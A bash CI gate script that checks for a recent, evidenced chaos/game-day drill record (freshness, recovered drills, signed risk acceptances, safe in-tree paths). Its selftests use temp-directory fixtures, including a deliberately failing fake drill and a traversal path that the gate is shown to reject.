#!/usr/bin/env bash
# WALTEUR chaos-resilience-gate — prove an ACTIVE chaos / game-day drill actually happened.
#
# WHY (complements resilience-lint): the static resilience-lint reads that retries/timeouts/circuit-breakers
# are WRITTEN. This gate demands you PULLED THE PLUG — injected a real fault, watched a steady-state metric,
# observed the blast radius, and recovered. A resilient-looking config that was never drilled is a hope, not
# a proof. This gate observes the drill RECORD (it never injects faults itself — a gate never hits the wire).
#
# APPLICABILITY (a resilience surface exists when ANY of):
#   - walteur-kit/build-contract.json .risk_tier is "high" or "regulated", OR
#   - an availability/SLO target is declared (build-contract .slo_target / .availability_target / .slo.*,
#     or a preflight-signals availability/slo flag, or walteur-kit/slo.json present).
#   No resilience surface => NOT_APPLICABLE, exit 0.
#
# HARD CHECK (exit-2 on checkable facts):
#   Surface present requires walteur-kit/chaos-report.json that:
#     - is valid JSON with drills:[ {hypothesis, fault_injected, steady_state_metric, blast_radius_observed,
#       recovered(bool), recovery_seconds(number), ran_ts, evidence_ref} ];
#     - is FRESH (ran_ts staleness math like browser-proof-gate; default WALTEUR_CHAOS_MAX_AGE_DAYS=30);
#     - has AT LEAST ONE drill with recovered==true whose evidence_ref points to a NON-EMPTY in-tree file;
#     - has NO drill with recovered==false UNLESS that drill carries a matching, non-empty signed
#       risk-acceptance ref (risk_acceptance_ref -> non-empty in-tree file). An un-accepted failed drill FAILs.
#
# PROTOCOL CHECK (existence/freshness only, NOT correctness):
#   The hypothesis / narrative quality is an LLM-authored judgement. The gate checks each drill carries a
#   non-empty hypothesis string; it does NOT and CANNOT vouch that the hypothesis is sound. Never treated as
#   correctness-blocking.
#
# CONTRACT: PAUSED => exit 2 · WALTEUR_CHAOS=off => loud SKIP exit 0 · artifact/tool absent => loud SKIP
#   (cannot_measure, never silent-green) · real violation => FAIL exit 2 · PASS only on OBSERVED evidence.
# Report: walteur-kit/chaos-resilience-report.json  (includes chaos_drill_observed marker on PASS).
# --help: self-documentation BEFORE any side effect (S033 usability contract)
case "${1:-}" in
  -h|--help)
  printf '%s\n' "chaos-resilience-gate - prove an ACTIVE chaos / game-day drill actually happened."
  printf '%s\n' "usage: bash chaos-resilience-gate.sh [--selftest|--help|<default run>]"
  printf '%s\n' "report: walteur-kit/chaos-resilience-report.json - fix recipes: walteur-kit/REMEDIATION.md (## chaos-resilience-gate)"
  printf '%s\n' "bypass: WALTEUR_CHAOS=off (recorded, not free)"
  exit 0 ;;
esac

set -uo pipefail

# absolute path to THIS script, resolved before any cd, so selftest's re-invocation is cwd-independent
case "$0" in
  /*|?:[\\/]*) SELF="$0" ;;
  *)  if [ -e "$0" ]; then SELF="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"; else SELF="$0"; fi ;;
esac

# Fail-closed source of the shared constant-exit/no-op probe guard (probe_proves_something). It closes the
# constant-exit CLASS that per-gate regex enumeration cannot. If it sources, PROBE_GUARD=1; if the file is
# absent at runtime, PROBE_GUARD stays 0 and the EXEC (re-run-the-drill) path FAILS CLOSED — never a silent
# skip of the unprovable-probe check. Same idiom as zero-downtime-cutover-gate.sh / authz-tenant-gate.sh.
PROBE_GUARD=0
if [ -f "${SELF%/*}/_probe-proof.sh" ]; then
  . "${SELF%/*}/_probe-proof.sh" && PROBE_GUARD=1
fi

ROOT="${WALTEUR_ROOT:-$(git rev-parse --show-toplevel 2>/dev/null || pwd)}"
ROOT="$(cd "$ROOT" 2>/dev/null && pwd || printf '%s' "$ROOT")"
KIT="$ROOT/walteur-kit"
CONTRACT="$KIT/build-contract.json"
SIGNALS="$KIT/preflight-signals.json"
SLO="$KIT/slo.json"
PROOF="$KIT/chaos-report.json"
PLAN="$KIT/chaos-plan.json"        # optional: may carry the chaos_probe.command instead of chaos-report.json
REPORT="$KIT/chaos-resilience-report.json"
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
TODAY="$(date -u +%F)"
MAX_AGE_DAYS="${WALTEUR_CHAOS_MAX_AGE_DAYS:-30}"
mkdir -p "$KIT"

have() { command -v "$1" >/dev/null 2>&1; }

# EXEC default: build-class-aware BUT NARROWER than the other 4 S033 hooks by design (S021 tradeoff) — a
# full kill/restart chaos drill per run is over-aggressive to force on every code build. So chaos-resilience
# only auto-arms WALTEUR_CHAOS_EXEC when walteur-kit/build-contract.json .risk_tier is "high" or "regulated"
# (NOT merely build_class in the code-class set). No contract, a lower risk_tier, or no risk_tier at all
# keeps the legacy default of 0 (shape-read). An explicit WALTEUR_CHAOS_EXEC env value always wins over
# this default, so WALTEUR_CHAOS_EXEC=0 still opts out even on a high/regulated risk_tier contract.
default_chaos_exec_armed() {
  [ -f "$CONTRACT" ] || return 1
  have jq || return 1
  _crt="$(jq -r '.risk_tier // ""' "$CONTRACT" 2>/dev/null)"
  case "$_crt" in high|regulated) return 0;; *) return 1;; esac
}
if [ -z "${WALTEUR_CHAOS_EXEC:-}" ] && default_chaos_exec_armed; then
  WALTEUR_CHAOS_EXEC=1
fi

write_report() {
  local verdict="$1" reason="$2" extra="${3:-}"
  [ -n "$extra" ] || extra='{}'
  if have jq && printf '%s\n' "$extra" | jq -e . >/dev/null 2>&1; then
    jq -n --arg v "$verdict" --arg ts "$TS" --arg reason "$reason" --arg proof "${PROOF#"$ROOT"/}" --argjson extra "$extra" \
      '{verdict:$v, ts:$ts, gate:"chaos-resilience-gate", proof_file:$proof, reason:$reason} + $extra' > "$REPORT" 2>/dev/null \
      && return 0
  fi
  printf '{"verdict":"%s","ts":"%s","gate":"chaos-resilience-gate","proof_file":"%s","reason":"%s"}\n' \
    "$verdict" "$TS" "${PROOF#"$ROOT"/}" "$reason" > "$REPORT" 2>/dev/null || true
}

# ── applicability: is there a resilience surface that warrants an active chaos drill? ───────────────
detect_surface() {
  SURFACE=0
  SURFACE_REASON=""

  if [ -f "$CONTRACT" ] && have jq && jq empty "$CONTRACT" >/dev/null 2>&1; then
    tier="$(jq -r '.risk_tier // empty' "$CONTRACT" 2>/dev/null || true)"
    case "$tier" in
      high|regulated)
        SURFACE=1; SURFACE_REASON="build-contract risk_tier '$tier'"; return 0 ;;
    esac
    # availability / SLO target declared in the contract
    if jq -e '
      ((.slo_target // empty) != empty)
      or ((.availability_target // empty) != empty)
      or ((.slo // empty) != empty and (.slo | type == "object"))
    ' "$CONTRACT" >/dev/null 2>&1; then
      SURFACE=1; SURFACE_REASON="build-contract declares an availability/SLO target"; return 0
    fi
  fi

  if [ -f "$SIGNALS" ] && have jq && jq empty "$SIGNALS" >/dev/null 2>&1; then
    if jq -e '
      ((.has_slo // false) == true)
      or ((.has_availability_target // false) == true)
      or ((.availability_slo // false) == true)
    ' "$SIGNALS" >/dev/null 2>&1; then
      SURFACE=1; SURFACE_REASON="preflight declares an availability/SLO target"; return 0
    fi
  fi

  if [ -f "$SLO" ]; then
    SURFACE=1; SURFACE_REASON="walteur-kit/slo.json present"; return 0
  fi
}

# staleness math (browser-proof-gate idiom: GNU -d OR BSD -j -f, accept date or full ISO ts)
date_to_epoch() {
  local v="$1"
  date -u -d "$v" +%s 2>/dev/null || date -u -j -f "%Y-%m-%dT%H:%M:%SZ" "$v" +%s 2>/dev/null \
    || date -u -j -f "%Y-%m-%d %H:%M:%S" "$v 00:00:00" +%s 2>/dev/null
}

# in-tree, non-empty, no traversal/absolute (browser-proof-gate safe_ref idiom)
safe_ref() {
  local ref="$1"
  [ -n "$ref" ] || return 1
  case "$ref" in
    /*|*../*|../*|*'/..'|*'//'*|?:[\\/]*) return 1 ;;
  esac
  [ -f "$ROOT/$ref" ] && [ -s "$ROOT/$ref" ]
}

# Count recovered:true drills in $1 whose OWN ran_ts is FRESH (within MAX_AGE_DAYS, not future) AND whose
# evidence_ref resolves to a safe, non-empty in-tree file. Echoes the count. Used by the EXEC path to verify
# that, AFTER re-running the drill, the report STILL carries a freshly-regenerated proven recovery — i.e. the
# drill regenerated its own evidence, not just exited 0. Reuses date_to_epoch / safe_ref (cwd-independent).
count_fresh_recovered_drills() {
  local file="$1" te n=0 rt ref re rage
  te="$(date_to_epoch "$(date -u +%F)")"
  [ -n "$te" ] || { printf '0'; return 0; }
  while IFS=$'\t' read -r rt ref; do
    safe_ref "$ref" || continue
    re="$(date_to_epoch "$rt")"
    [ -n "$re" ] || continue
    [ "$re" -le $((te + 86400)) ] || continue
    rage=$(( (te - re) / 86400 )); [ "$rage" -lt 0 ] && rage=0
    [ "$rage" -le "$MAX_AGE_DAYS" ] && n=$((n+1))
  done < <(jq -r '.drills[]? | select(.recovered == true) | [ (.ran_ts // ""), (.evidence_ref // "") ] | @tsv' "$file" 2>/dev/null)
  printf '%s' "$n"
}

selftest() {
  local pass=0 fail=0 tmp today
  today="$(date -u +%F)"

  ck() {
    local name="$1" want="$2" got="$3"
    if [ "$want" = "$got" ]; then
      echo "  ok   - $name (rc=$got)"
      pass=$((pass+1))
    else
      echo "  FAIL - $name (want $want got $got)"
      fail=$((fail+1))
    fi
  }

  if ! have jq; then
    echo "chaos-resilience-gate selftest SKIP - jq not installed."
    return 0
  fi

  # mark a resilience surface: high risk tier
  make_surface() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit"
    printf '{"id":"svc","build_class":"software","risk_tier":"high"}\n' > "$dst/walteur-kit/build-contract.json"
  }

  # mark a surface via SLO target only (low/medium tier) to prove the availability arm
  make_slo_surface() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit"
    printf '{"id":"svc","build_class":"software","risk_tier":"medium","slo_target":"99.9"}\n' > "$dst/walteur-kit/build-contract.json"
  }

  # NO resilience surface: low risk, no SLO, no slo.json, no preflight slo flag
  make_no_surface() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit" "$dst/src"
    printf '<div>app</div>\n' > "$dst/src/App.tsx"
    printf '{"id":"toy","build_class":"software","risk_tier":"low"}\n' > "$dst/walteur-kit/build-contract.json"
  }

  make_evidence() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit/chaos"
    printf 'killed primary db pod; reads served from replica; recovered in 7s\n' > "$dst/walteur-kit/chaos/db-failover.txt"
    printf 'latency p99 stayed under 500ms during fault window\n' > "$dst/walteur-kit/chaos/steady-state.txt"
    printf 'SIGNED: VP Eng accepts residual risk of cache-stampede drill; ticket RISK-412\n' > "$dst/walteur-kit/chaos/risk-acceptance.txt"
  }

  # GOOD twin: fresh, one recovered:true drill w/ non-empty evidence_ref
  make_good_proof() {
    local dst="$1" ran_ts="${2:-${today}T12:00:00Z}"
    mkdir -p "$dst/walteur-kit"
    cat > "$dst/walteur-kit/chaos-report.json" <<JSON
{
  "schema_version": 1,
  "report_id": "chaos-selftest",
  "drills": [
    {
      "hypothesis": "If the primary DB dies, reads fail over to the replica within the SLO budget.",
      "fault_injected": "kill primary database pod",
      "steady_state_metric": "read p99 latency < 500ms, error rate < 1%",
      "blast_radius_observed": "writes paused 7s; reads uninterrupted via replica",
      "recovered": true,
      "recovery_seconds": 7,
      "ran_ts": "$ran_ts",
      "evidence_ref": "walteur-kit/chaos/db-failover.txt"
    }
  ]
}
JSON
  }

  echo "chaos-resilience-gate selftest:"

  # 1. no resilience surface -> NOT_APPLICABLE exit 0
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_no_surface "$tmp"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "no resilience surface -> NOT_APPLICABLE" 0 "$?"
  rm -rf "$tmp"

  # 2. surface but chaos-report.json absent -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "surface without chaos-report.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 3. invalid JSON -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"
  printf '{ bad json\n' > "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "invalid chaos-report.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 4. GOOD twin: fresh recovered drill + non-empty evidence -> PASS (shape-read; pin EXEC=0 since
  #    make_surface is risk_tier:high, which S033 now auto-arms — this twin tests shape-read semantics)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  WALTEUR_CHAOS_EXEC=0 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "fresh recovered drill + nonempty evidence -> PASS" 0 "$?"
  jq -e '.chaos_drill_observed != null' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "report records chaos_drill_observed marker" 0 "$?"
  rm -rf "$tmp"

  # 4b. surface via SLO target only (medium tier) still applies + PASS on good proof
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_slo_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "SLO-target surface (medium tier) + good proof -> PASS" 0 "$?"
  rm -rf "$tmp"

  # 5. POISONED: stale file -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp" "2000-01-01T00:00:00Z"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "stale chaos report -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 6. POISONED: evidence_ref points to a MISSING file -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  rm -f "$tmp/walteur-kit/chaos/db-failover.txt"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "evidence_ref missing file -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 7. POISONED: evidence_ref present but EMPTY string -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq '.drills[0].evidence_ref = ""' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "evidence_ref empty string -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 7b. POISONED: evidence_ref points to an empty (zero-byte) file -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  : > "$tmp/walteur-kit/chaos/db-failover.txt"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "evidence_ref empty file -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 8. POISONED: recovered:false with NO risk-acceptance ref -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq '.drills += [{
        hypothesis:"If the cache dies, the origin survives the stampede.",
        fault_injected:"flush + disable redis",
        steady_state_metric:"origin error rate < 1%",
        blast_radius_observed:"origin overwhelmed; 12% errors for 90s",
        recovered:false,
        recovery_seconds:0,
        ran_ts:("'"$today"'"+"T12:00:00Z"),
        evidence_ref:"walteur-kit/chaos/steady-state.txt"
      }]' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "recovered:false without risk-acceptance -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 8b. recovered:false WITH a non-empty signed risk-acceptance ref -> PASS (accepted residual risk)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq '.drills += [{
        hypothesis:"If the cache dies, the origin survives the stampede.",
        fault_injected:"flush + disable redis",
        steady_state_metric:"origin error rate < 1%",
        blast_radius_observed:"origin overwhelmed; 12% errors for 90s",
        recovered:false,
        recovery_seconds:0,
        ran_ts:("'"$today"'"+"T12:00:00Z"),
        evidence_ref:"walteur-kit/chaos/steady-state.txt",
        risk_acceptance_ref:"walteur-kit/chaos/risk-acceptance.txt"
      }]' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  # shape-read twin (no chaos_probe declared); pin EXEC=0 since make_surface is risk_tier:high (S033 auto-arm)
  WALTEUR_CHAOS_EXEC=0 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "recovered:false WITH signed risk-acceptance -> PASS" 0 "$?"
  rm -rf "$tmp"

  # 8c. REGRESSION (skeptic Attack 10): a STALE recovered:true drill (400d old) must NOT be laundered
  #     "fresh" by an unrelated FRESH recovered:false drill that carries a valid signed risk-acceptance.
  #     The fresh sibling freshens the global newest_ts, but freshness must be judged on the RECOVERY
  #     drill's own ran_ts -> FAIL. (Pre-fix this PASSed.)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"
  old_ts="$(date -u -d '400 days ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -v-400d +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || printf '2000-01-01T00:00:00Z')"
  cat > "$tmp/walteur-kit/chaos-report.json" <<JSON
{
  "schema_version": 1,
  "report_id": "chaos-selftest-stale-recovery-fresh-sibling",
  "drills": [
    {
      "hypothesis": "If the primary DB dies, reads fail over to the replica within the SLO budget.",
      "fault_injected": "kill primary database pod",
      "steady_state_metric": "read p99 latency < 500ms, error rate < 1%",
      "blast_radius_observed": "writes paused 7s; reads uninterrupted via replica",
      "recovered": true,
      "recovery_seconds": 7,
      "ran_ts": "$old_ts",
      "evidence_ref": "walteur-kit/chaos/db-failover.txt"
    },
    {
      "hypothesis": "If the cache dies, the origin survives the stampede.",
      "fault_injected": "flush + disable redis",
      "steady_state_metric": "origin error rate < 1%",
      "blast_radius_observed": "origin overwhelmed; 12% errors for 90s",
      "recovered": false,
      "recovery_seconds": 0,
      "ran_ts": "${today}T12:00:00Z",
      "evidence_ref": "walteur-kit/chaos/steady-state.txt",
      "risk_acceptance_ref": "walteur-kit/chaos/risk-acceptance.txt"
    }
  ]
}
JSON
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "stale recovery laundered fresh by fresh accepted-failure sibling -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 9. POISONED: no drill recovered:true at all (only an accepted failure) -> FAIL (need >=1 success)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"
  cat > "$tmp/walteur-kit/chaos-report.json" <<JSON
{
  "schema_version": 1,
  "report_id": "chaos-selftest-no-success",
  "drills": [
    {
      "hypothesis": "If the cache dies, the origin survives.",
      "fault_injected": "disable redis",
      "steady_state_metric": "origin error rate < 1%",
      "blast_radius_observed": "origin overwhelmed",
      "recovered": false,
      "recovery_seconds": 0,
      "ran_ts": "${today}T12:00:00Z",
      "evidence_ref": "walteur-kit/chaos/steady-state.txt",
      "risk_acceptance_ref": "walteur-kit/chaos/risk-acceptance.txt"
    }
  ]
}
JSON
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "no recovered:true drill at all -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 10. POISONED: empty drills array -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq '.drills = []' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "empty drills array -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 11. POISONED: drill missing a required field (steady_state_metric) -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq 'del(.drills[0].steady_state_metric)' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "drill missing required field -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 12. POISONED: unsafe (traversal) evidence_ref -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  jq '.drills[0].evidence_ref = "../outside.txt"' "$tmp/walteur-kit/chaos-report.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/chaos-report.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "unsafe (traversal) evidence_ref -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # ── EXEC-PATH TWINS (WALTEUR_CHAOS_EXEC=1) ────────────────────────────────────────────────────────
  # A tiny SELF-CONTAINED synthetic drill the selftest writes — NOT a real long-running server. It just
  # regenerates a fresh recovered:true chaos-report.json + touches its evidence file, then exits with a
  # chosen code. This exercises the re-run-and-observe path without needing a real server in the selftest.
  #   $1=dst  $2=exit_code  $3=refresh(true|false — whether it regenerates fresh recovery)
  write_fake_drill() {
    local dst="$1" code="${2:-0}" refresh="${3:-true}"
    mkdir -p "$dst/walteur-kit/chaos" "$dst/ops"
    cat > "$dst/ops/chaos.sh" <<DRILL
#!/usr/bin/env bash
# synthetic self-contained fake drill (selftest only): regenerate fresh recovery evidence + report, then exit.
set -u
HERE="\$(cd "\$(dirname "\$0")" && pwd)"; ROOT="\$(cd "\$HERE/.." && pwd)"
if [ "$refresh" = "true" ]; then
  NOW="\$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf 'fake drill regenerated evidence at %s\n' "\$NOW" > "\$ROOT/walteur-kit/chaos/db-failover.txt"
  cat > "\$ROOT/walteur-kit/chaos-report.json" <<JSON
{
  "schema_version": 1,
  "report_id": "chaos-selftest-fake-drill",
  "drills": [
    {
      "hypothesis": "If the primary dies, reads fail over to the replica within the SLO budget.",
      "fault_injected": "process-kill",
      "steady_state_metric": "read p99 latency < 500ms, error rate < 1%",
      "blast_radius_observed": "writes paused; reads uninterrupted via replica",
      "recovered": true,
      "recovery_seconds": 3,
      "ran_ts": "\$NOW",
      "evidence_ref": "walteur-kit/chaos/db-failover.txt"
    }
  ]
}
JSON
fi
exit $code
DRILL
    chmod +x "$dst/ops/chaos.sh" 2>/dev/null || true
  }

  # set the chaos_probe.command on the report ($3) or a chaos-plan.json ($4=plan)
  set_chaos_probe() {
    local dst="$1" cmd="$2" where="${3:-report}"
    if [ "$where" = "plan" ]; then
      jq -n --arg c "$cmd" '{schema_version:1, chaos_probe:{command:$c}}' > "$dst/walteur-kit/chaos-plan.json"
    else
      jq --arg c "$cmd" '.chaos_probe = {command:$c}' "$dst/walteur-kit/chaos-report.json" > "$dst/walteur-kit/tmp.json" && mv "$dst/walteur-kit/tmp.json" "$dst/walteur-kit/chaos-report.json"
    fi
  }

  # E1. EXEC + real self-contained drill that refreshes recovery + exits 0 -> PASS with chaos_probe_executed marker
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + drill refreshes + exits 0 -> PASS" 0 "$?"
  jq -e '.chaos_probe_executed == true and .observed_exit == 0' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "EXEC PASS records chaos_probe_executed:true + observed_exit:0" 0 "$?"
  jq -e '.reason | test("OBSERVED by re-executing")' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "EXEC PASS reason contains 'OBSERVED by re-executing'" 0 "$?"
  rm -rf "$tmp"

  # E1b. EXEC + probe declared in chaos-plan.json (not the report) -> PASS (both sources honored)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh" plan
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + chaos_probe in chaos-plan.json -> PASS" 0 "$?"
  rm -rf "$tmp"

  # E2. EXEC + drill that exits 1 -> FAIL (executed, did not recover)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 1 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + drill exits 1 -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E3. EXEC + drill exits 0 but does NOT refresh recovery, and we STALE the pre-existing recovery so no
  #     fresh recovered drill remains after the run -> FAIL (exit 0 alone is not enough; needs fresh evidence)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 false
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  # stale the recovery ran_ts so, since the no-refresh drill won't update it, no fresh recovery survives.
  # (We must keep the report shape-valid so it passes the pre-EXEC shape checks; we re-stale AFTER would
  #  be impossible — instead the EXEC path's post-drill freshness recount catches the unrefreshed stale ts.)
  # Use a ran_ts that is still fresh enough to pass the pre-EXEC gate but the no-refresh drill leaves it as
  # the ONLY recovery; to force "no fresh recovery after run" we make the drill exit 0 WITHOUT refreshing
  # AND delete the evidence file so safe_ref fails post-run.
  rm -f "$tmp/walteur-kit/chaos/db-failover.txt"
  # re-touch evidence so the PRE-exec shape check passes, but have the fake drill (refresh=false) remove it.
  printf 'pre-exec evidence\n' > "$tmp/walteur-kit/chaos/db-failover.txt"
  cat > "$tmp/ops/chaos.sh" <<'DRILL'
#!/usr/bin/env bash
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; ROOT="$(cd "$HERE/.." && pwd)"
# exit 0 but SABOTAGE the recovery evidence so no fresh recovered drill survives the run
rm -f "$ROOT/walteur-kit/chaos/db-failover.txt"
exit 0
DRILL
  chmod +x "$tmp/ops/chaos.sh" 2>/dev/null || true
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + drill exits 0 but no fresh recovery regenerated -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E4. EXEC + trivial probe (bash -c 'exit 0') -> FAIL (no-op rejected, never run)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  set_chaos_probe "$tmp" "bash -c 'exit 0'" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + trivial probe (bash -c 'exit 0') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E4b. EXEC + bare-constant probe (true) -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  set_chaos_probe "$tmp" "true" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + bare constant (true) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E5. EXEC + non-allowlisted runner naming a real script -> FAIL (injection guard). Seed a real file so it
  #     passes the shared probe-proof guard; the FAIL must come from the runner allowlist.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 true
  set_chaos_probe "$tmp" "helm ops/chaos.sh" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
